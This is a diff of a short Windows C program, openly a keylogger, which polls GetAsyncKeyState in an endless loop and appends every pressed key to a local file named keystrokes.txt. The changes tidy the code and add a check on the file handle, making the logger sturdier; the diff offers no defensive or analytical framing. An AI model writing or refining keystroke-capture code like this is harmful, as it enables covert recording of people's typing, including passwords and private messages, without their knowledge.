@@ -1,6 +1,8 @@
-#include <windows.h>
 
+#include <windows.h>
 #include <stdio.h>
+
+int keylogg();
 
 int main() { 
     keylogg();
@@ -24,7 +26,6 @@ int main() {
     return 0;
 }
 
-
 int keylogg() {
     char key;
     while(1) {
@@ -33,10 +34,13 @@ int keylogg() {
             if(GetAsyncKeyState(key) == -32767) {
                 FILE *fp;
                 fp = fopen("keystrokes.txt", "a+");
-                fprintf(fp, "%c", key);
-                fclose(fp);
+                if (fp != NULL) {
+                    fprintf(fp, "%c", key);
+                    fclose(fp);
+                }
             }
         }
     }
+    
     return 0;
 }
